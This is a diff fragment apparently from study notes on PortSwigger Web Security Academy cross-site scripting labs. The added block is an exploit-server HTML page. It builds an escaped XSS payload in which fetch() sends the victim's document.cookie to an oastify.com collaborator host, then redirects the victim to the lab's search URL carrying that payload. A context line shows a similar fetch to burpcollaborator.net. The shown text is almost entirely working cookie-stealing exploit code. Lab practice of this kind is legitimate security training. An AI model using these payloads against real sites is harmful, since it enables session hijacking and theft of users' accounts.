@@ -9,6 +9,19 @@ fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,bo
 </script>
 ```  
 
+```html
+<html>
+  <body>
+    <script>
+      // here we are escaping the ' and \ character
+      let payload = '"-fetch(\'https://qvprn7l7u49gkk6qxf1405gk4ba2y5mu\\x2eoastify\\x2ecom?c=\'+document[\'cookie\'])-"';
+      
+      location.href = 'https://0a7000d004aa305c80722195005c00f0.web-security-academy.net/?SearchTerm=' + encodeURIComponent(payload);
+    </script>
+  </body>
+</html>
+```
+
 >Steal Cookies Exploit Server:  
 
 ```html
